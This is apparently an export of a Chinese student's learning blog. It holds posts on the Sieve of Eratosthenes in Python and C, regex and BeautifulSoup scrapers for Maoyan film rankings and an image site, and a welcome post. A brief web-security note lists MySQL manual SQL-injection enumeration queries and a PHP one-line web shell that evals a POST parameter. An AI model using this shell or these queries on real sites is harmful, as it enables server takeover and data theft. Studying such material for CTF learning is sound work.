    <content type="text"><![CDATA[昨天实验课上，当我判断质数还在用取模方法的时候，打ACM的大佬刁老板对我说出埃氏筛，随后回到宿舍开始查，到现在整理完思路已经凌晨1点，在瑟瑟发抖中写下这篇博客。 埃拉托斯特尼筛法，简称埃氏筛或爱氏筛，是一种由希腊数学家埃拉托斯特尼所提出的一种简单检定素数的算法。要得到自然数n以内的全部素数，必须把不大于根号n的所有素数的倍数剔除，剩下的就是素数。下面用python实现12345678910111213141516171819202122232425262728def JudgePrimes(n): primes = [] f = [] for i in range(n+1):#这样写，可以把自然数和列表元素的序号对应起来。 if i &gt; 2 and i%2 == 0:#把从0到n的偶数筛掉。 f.append(0) else: f.append(1) i = 3 while i*i &lt;= n: #把不大于根号n的所有质数的倍数剔除,剩下的就是质数 if f[i] == 1:#判断是不是质数，若是质数，则筛掉其倍数 j = 2*i while j&lt;=n:#把小于n的所有质数的倍数都筛掉 f[j] = 0 j += i i += 2 primes.append(2)#2是质数 for x in range(3,n+1): if f[x] == 1: primes.append(x) return primes n = int(input("请输入大于1的正整数n："))primes = JudgePrimes(n)print (primes) 算法可以进一步优化123456789101112131415161718192021222324252627def JudgePrimes(n): primes = [] f = [] for i in range(n+1): if i &gt; 2 and i%2 == 0: f.append(0) else: f.append(1) i = 3 while i*i &lt;= n: #把不大于根号n的所有质数的倍数剔除,剩下的就是质数 if f[i] == 1:#判断是不是质数，若是质数，则筛掉其倍数 j = i*i #直接从质数的平方后开始筛，因为质数的平方之前的数已经被上一个质数筛过了，此时j为奇数 while j &lt;= n: f[j] = 0 j += 2*i #如果只加一个i,j则为i的偶数倍是一个偶数已经被筛过了，所以加2个i筛掉i的奇数倍，小优化。 i += 2 primes.append(2)#2是质数 for x in range(3,n+1,2):#步长为2，把偶数跳过,小优化。 if f[x] == 1: primes.append(x) return primes n = int(input("请输入大于1的正整数n："))primes = JudgePrimes(n)print (primes) 我的c语言抠脚，下面放上照着python写的c程序1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;int main()&#123; int n,j; scanf("%d",&amp;n); int f[n+1]; for(int i=0;i&lt;=n;i++) &#123; if(i&gt;2&amp;&amp;i%2==0)f[i]=0; else f[i]=1; &#125; int i =3; while(i*i&lt;=n) &#123; if(f[i] ==1) &#123; j=i*i; while (j&lt;=n) &#123; f[j]=0; j+=2*i; &#125; &#125; i+=2; &#125; f[2]=1; printf("2 "); for(int k=3;k&lt;=n;k+=2) &#123; if(f[k]==1)printf("%d ",k); &#125; return 0;&#125; 然后我学到教材指针这部分，看见教材给了动态一维数组筛选法的例子。1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; int i,j,n; int *s; do &#123; printf("Please input n:\n"); scanf("%d",&amp;n); &#125; while (n&lt;=0); s=(int*) calloc(n+1,sizeof(int)); if(s==NULL) &#123; printf("allocation failure"); exit(1); &#125; s[0]=s[1]=1; for(i=2;i&lt;=n;i++) &#123; if(s[i]==0) &#123; for(j=2*i;j&lt;n+1;j+=i)s[j]=1; &#125; &#125; for(i=0;i&lt;=n;i++) &#123; if(!s[i])printf("%5d",i); &#125; free(s); return 0;&#125;]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取猫眼电影top100]]></title>
    <url>%2F2018%2F10%2F26%2F%E7%88%AC%E5%8F%96%E7%8C%AB%E7%9C%BC%E7%94%B5%E5%BD%B1top100%2F</url>
    <content type="text"><![CDATA[昨天学了正则，有点膨胀，来爬爬猫眼电影top100试试看。http://maoyan.com/board/4 用到的模块12import requestsimport re 用正则表达式匹配下载当页信息首先打开网页，右键霸王别姬检查元素，可以发现我们要提取的信息。接下来就是写代码用正则把内匹配下来12345678910111213headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'&#125;r = requests.get('http://maoyan.com/board/4?offset=0',headers=headers)results = re.findall( '&lt;a.*?title="(.*?)".*?class="image-link".*?class="star"&gt;(.*?)&lt;/p&gt;.*?&lt;p class="releasetime"&gt;(.*?)&lt;/p&gt;.*?&lt;i class="integer"&gt;(.*?)&lt;/i&gt;&lt;i class="fraction"&gt;(.*?)&lt;/i&gt;&lt;/p&gt; ', r.text, re.S)'''findall方法会把匹配到的小括号里的一组内容加工成元组，再把所有元组以列表形式返回.*?可以非贪婪匹配任意除换行字符，只要把想提取的内容以.*?代替就好了，再加个小括号我们只需要写要提取的内容前面和后面的几个字符就好了，其他的冗长字符也可用.*?代替第二个参数是被匹配的文本，传入网页源代码即可因为标签之间还有好多换行，而.*?无法匹配换行，加上re.S这个参数，就可以匹配到了''' 再写个循环把提取到的内容写进txt文件即可123456789for i in results: with open('top100.txt', 'a',encoding='utf-8') as f: f.write(i[0] + ' ' + re.sub('\n\s+', '', str(i[1])) + ' ' + i[2] + ' ' + '评分：' + i[3] + i[4] + '\n')'''a表示追加写入，要加上encoding='utf-8'，不然会编码错误i[0] i[1]等表示当前列表里的某个元组的第几个内容我们会发现元组里的第二个内容有许多空格和换行，所以我们用sub方法拿''空字符替换掉，第一个参数是被替换字符，第二个参数是替换字符，第三个参数是被操作的文本，所以我们需要把元组的内容转换成字符串。''' 写个循环爬取所有页面的内容我们发现网页的地址格式是http://maoyan.com/board/4?offset= + 0,10,20,30…10012345for i in range(0,110,10): url = 'http://maoyan.com/board/4?offset=' + str(i)'''第三个参数是步长，即每次增加10，因为range里的两个数字是前闭后开，所以第二个参数要比100大，这样我们就得到0,10,20到100的数然后再把上面的代码写成函数，在这个循环里调用即可''' 这次我终于用上函数了附上全部代码,原谅小白的代码吧。12345678910111213141516import requestsimport redef get_information(url): headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'&#125; r = requests.get(url,headers=headers) result = re.findall( '&lt;a.*?title="(.*?)".*?class="image-link".*?class="star"&gt;(.*?)&lt;/p&gt;.*?&lt;p class="releasetime"&gt;(.*?)&lt;/p&gt;.*?&lt;i class="integer"&gt;(.*?)&lt;/i&gt;&lt;i class="fraction"&gt;(.*?)&lt;/i&gt;&lt;/p&gt; ', r.text, re.S) for i in result: with open('top100.txt', 'a',encoding='utf-8') as f: f.write(i[0] + ' ' + re.sub('\n\s+', '', str(i[1])) + ' ' + i[2] + ' ' + '评分：' + i[3] + i[4] + '\n')for i in range(0,110,10): url = 'http://maoyan.com/board/4?offset=' + str(i) get_information(url)]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初学python爬虫]]></title>
    <url>%2F2018%2F10%2F22%2F%E5%88%9D%E5%AD%A6python%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[菜鸟初学python爬虫，爬一个没有反爬的炒鸡简单的网站。http://www.mzitu.com/zipai/ 用到的模块123import requestsfrom bs4 import BeautifulSoupimport os 找到当前页面图片地址首先打开网站，右键图片点击检查，发现图片地址在p标签下的img标签中储存。先用get方法获取页面内容，再用BeautifulSoup煲汤。1234r = requests.get('http://www.mzitu.com/zipai/')soup = BeautifulSoup(r.text,'lxml') #需要 pip install lxmllist1 = []list1 = soup.select('p &gt; img') 然后再用for循环提取出img的属性1234list2 =[]for i in list1: list2.append(i.get('src')) print(i.get('src')) 下载图片12345678os.mkdir('D:/妹子图')os.chdir('D:/妹子图')for i in list2: img = requests.get(i) filename = i.split('/')[-1] with open(filename,'wb') as f: f.write(img.content) 循环每个页面很容易可以观察到，地址的格式是”http://www.mzitu.com/zipai/comment-page-&quot;+ 页数+”/#comments”因此写个for循环即可遍历地址12for i in range(1,365): url ="http://www.mzitu.com/zipai/comment-page-"+ str(i)+"/#comments" 再把url传入上面的方法即可。 小问题1234567891011121314151617181920import requestsfrom bs4 import BeautifulSoupimport osos.mkdir('D:/妹子图')os.chdir('D:/妹子图')for i in range(1,365): url ="http://www.mzitu.com/zipai/comment-page-"+ str(i)+"/#comments" r = requests.get(url) soup = BeautifulSoup(r.text,'lxml') list1 = soup.select('p &gt; img') list2 =[] for i in list1: list2.append(i.get('src')) print(i.get('src')) for i in list2: img = requests.get(i) filename = i.split('/')[-1] with open(filename,'wb') as f: f.write(img.content)]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[菜鸟初学web]]></title>
    <url>%2F2018%2F10%2F19%2F%E8%8F%9C%E9%B8%9F%E5%88%9D%E5%AD%A6web%2F</url>
    <content type="text"><![CDATA[mysql手工注入:123select schema_name from information_schema.schemata;爆库名select table_name from information_schema.tables where table_schema="";爆表名select column_name from information_schema.columns where table_name="";爆列名 php一句话木马:123&lt;?php @eval($_POST['pass']);?&gt;"?&gt;&lt;?php @eval($_POST[ 'pass' ]);?&gt;&lt;?php#]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>sql漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Welcome to my blog.]]></title>
    <url>%2F2018%2F10%2F18%2FMy%20first%20blog%2F</url>
    <content type="text"><![CDATA[学校里全是dalao，加油鸭！一定要成为一名牛逼的CTFer！不负自己，未来可期！]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
</search>
